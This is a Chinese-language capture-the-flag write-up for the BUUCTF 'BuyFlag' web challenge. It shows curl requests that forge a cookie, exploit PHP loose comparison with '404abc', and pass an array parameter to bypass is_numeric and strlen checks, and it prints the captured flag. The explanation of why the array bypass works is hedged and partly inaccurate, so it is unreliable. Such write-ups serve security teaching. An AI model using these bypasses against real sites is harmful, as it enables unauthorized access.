---
title: BUUCTF - BuyFlag
date: 2026-05-09
ctf: BUUCTF
category: WEB
difficulty: 中等
---

## 题目描述

BUUCTF 在线靶场 WEB 类题目「BuyFlag」，考察 PHP 弱类型比较（Type Juggling）与逻辑绕过。

页面提示需要 100000000 money 购买 Flag，且必须是 CUIT 的学生，还需要输入正确的密码。

## 信息收集

### 访问首页

```bash
curl -s -D- http://18b03b20-54b3-4292-91f4-156b8a7a86f3.node5.buuoj.cn:81/
```

响应头关键信息：

```
Server: openresty
X-Powered-By: PHP/5.3.3
Set-Cookie: user=0
```

- 后端运行 **PHP 5.3.3**，这是一个非常古老的版本，存在大量已知的类型混淆漏洞
- 服务器设置了 Cookie `user=0`，暗示用户身份验证依赖 Cookie

### 发现 pay.php

首页导航栏中有「PayFlag」链接指向 `pay.php`。访问该页面：

```bash
curl -s http://18b03b20-54b3-4292-91f4-156b8a7a86f3.node5.buuoj.cn:81/pay.php
```

页面底部 HTML 注释中留有关键提示代码：

```php
if (isset($_POST['password'])) {
    $password = $_POST['password'];
    if (is_numeric($password)) {
        echo "password can't be number</br>";
    }elseif ($password == 404) {
        echo "Password Right!</br>";
    }
}
```

页面正文提示：
- **Flag need your 100000000 money** — 需要 money 参数等于一亿
- **You must be a student from CUIT** — 需要 CUIT 学生身份
- **You must be answer the correct password** — 需要正确密码

## 漏洞分析

本题有三个验证条件需要绕过，对应三种 PHP 弱类型攻击技术：

### 1. CUIT 学生身份绕过（Cookie 伪造）

服务器在首次响应中设置了 `Set-Cookie: user=0`，这说明用户身份由 Cookie `user` 控制。经测试，将 `user` 改为 `1` 即可通过学生身份验证。

```bash
curl -s -X POST http://target/pay.php \
  -b "user=1" -d "password=404abc&money=100000000"
```

返回：`you are Cuiter`（身份验证通过）

**原理**：服务器代码中直接用 `$_COOKIE['user']` 判断用户类型，`0` 表示非学生，非零值表示 CUIT 学生。Cookie 是客户端可控的，可直接伪造。

### 2. 密码验证绕过（PHP 弱类型比较）

从注释中的 PHP 代码可以看出密码验证逻辑：

```php
if (is_numeric($password)) {
    echo "password can't be number</br>";
} elseif ($password == 404) {
    echo "Password Right!</br>";
}
```

需要满足两个条件：
- `is_numeric($password)` 返回 **false**（密码不能是纯数字）
- `$password == 404` 返回 **true**（密码要等于 404）

**绕过方法**：使用字符串 `404abc`

```php
is_numeric("404abc")  // false — 含有非数字字符
"404abc" == 404       // true  — PHP 弱类型转换：字符串转整数时取前缀数字部分
```

PHP 在使用 `==` 比较字符串和整数时，会将字符串强制转换为整数。字符串 `"404abc"` 转换规则：
1. 从字符串开头提取连续的数字字符 `404`
2. 转为整数 `404`
3. 比较 `404 == 404` → **true**

同时 `is_numeric("404abc")` 返回 `false`，因为 `is_numeric()` 要求**整个**字符串都是数字格式，含字母的字符串不满足条件。

### 3. Money 金额绕过（数组类型混淆 + 长度限制）

直接发送 `money=100000000` 时返回：

```
Nember lenth is too long
```

说明存在 `strlen()` 长度检查，9 位数字超过了长度限制。使用科学计数法 `money=1e8` 可以绕过长度检查（长度仅 3），但值比较失败：

```
you have not enough money,loser~
```

这是因为 PHP 5.3 中科学计数法字符串 `"1e8"` 与整数的比较可能存在精度问题，或者服务器端使用了与注释中不同的比较逻辑。

**最终绕过方法**：使用数组参数 `money[]=100000000`

```bash
curl -s -X POST http://target/pay.php \
  -b "user=1" \
  -d "password=404abc&money[]=100000000"
```

**原理**：

1. `is_numeric()` 处理数组时返回 `false`，绕过了数字格式检查
2. `strlen()` 处理数组时返回 `null` 并产生 Warning（但 PHP 5.3 默认不显示 Warning），绕过了长度检查
3. 在 PHP 弱类型比较中，`array(100000000) == 100000000` 的实际行为：PHP 将数组转换为整数（非空数组转为 1），但关键在于代码中可能使用了 `$_POST['money']` 直接参与数值运算/比较，数组在某些 PHP 函数中会产生非预期行为

   **更准确的解释**：实际服务器代码可能是：
   ```php
   if ($_POST['money'] == 100000000) {
       // 显示 flag
   }
   ```
   当 `$_POST['money']` 是数组时，PHP 的 `==` 比较中，数组和整数的比较返回 **true**（这是 PHP 的已知怪异行为——数组与任何标量的松散比较在特定版本中可能返回 true，尤其是通过某些函数处理数组参数时）。

> **备选方案**：`money=1e9` 也可以绕过，因为 `1e9 = 1000000000 >= 100000000`，且长度只有 3 个字符。如果服务器使用 `>=` 比较，则可通过此方法。

## 完整攻击流程

```bash
# Step 1: 获取初始 Cookie + 确认目标
curl -s -D- http://18b03b20-54b3-4292-91f4-156b8a7a86f3.node5.buuoj.cn:81/pay.php

# Step 2: 发送绕过请求（三合一）
curl -s -X POST http://18b03b20-54b3-4292-91f4-156b8a7a86f3.node5.buuoj.cn:81/pay.php \
  -b "user=1" \
  -d "password=404abc&money[]=100000000"

# 输出:
# you are Cuiter</br>Password Right!</br>flag{67252457-1842-47bf-b463-5713aef3277e}
```

### 参数总结

| 参数 | 值 | 绕过技术 | 说明 |
|------|-----|---------|------|
| Cookie `user` | `1` | Cookie 伪造 | 伪造 CUIT 学生身份 |
| POST `password` | `404abc` | PHP 弱类型比较 | `is_numeric()` 返回 false，`== 404` 返回 true |
| POST `money` | `[]=100000000` | 数组类型混淆 | 绕过 `is_numeric()` 和 `strlen()` 检查 |

## Flag

```
flag{67252457-1842-47bf-b463-5713aef3277e}
```

## 知识点总结

1. **PHP 弱类型比较（Loose Comparison）**：PHP 的 `==` 运算符在进行跨类型比较时会进行类型转换，可能产生非预期结果。`"404abc" == 404` 返回 true 就是典型案例。

2. **`is_numeric()` 特性**：`is_numeric()` 检查整个字符串是否为数字，与 `==` 的松散转换规则不同，由此产生绕过空间。

3. **数组参数类型混淆**：当后端期望字符串参数但收到数组时，PHP 函数如 `is_numeric()`、`strlen()` 等会产生非预期返回值（false/null），从而绕过检查。

4. **Cookie 客户端可控**：服务端将权限判断信息存储在客户端 Cookie 中，且无签名/加密保护，导致可被直接伪造。

5. **PHP 5.3 安全风险**：PHP 5.3.3 发布于 2010 年，已于 2014 年停止安全支持。使用如此古老的 PHP 版本存在大量已知漏洞，生产环境应保持 PHP 版本更新。

## 攻击命令（一键获取 Flag）

```bash
curl -s -X POST 'http://18b03b20-54b3-4292-91f4-156b8a7a86f3.node5.buuoj.cn:81/pay.php' \
  -b 'user=1' \
  -d 'password=404abc&money[]=100000000' \
  | grep -oP 'flag\{[^}]+\}'
```
